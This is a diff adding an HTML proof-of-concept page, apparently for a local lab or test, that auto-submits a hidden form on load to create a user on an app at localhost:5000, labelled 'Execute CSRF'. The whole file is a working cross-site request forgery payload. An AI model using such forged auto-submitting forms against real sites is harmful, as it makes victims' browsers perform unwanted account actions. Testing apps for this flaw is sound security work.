@@ -1,0 +1,8 @@
+<body onload="document.forms[0].submit()">
+  <form action="http://localhost:5000/users" method="POST">
+    <input type="hidden" name="name" value="csrf_user"/>
+    <input type="hidden" name="password" value="password"/>
+    <input type="submit" value="Execute CSRF"/>
+  </form>
+</body>
+
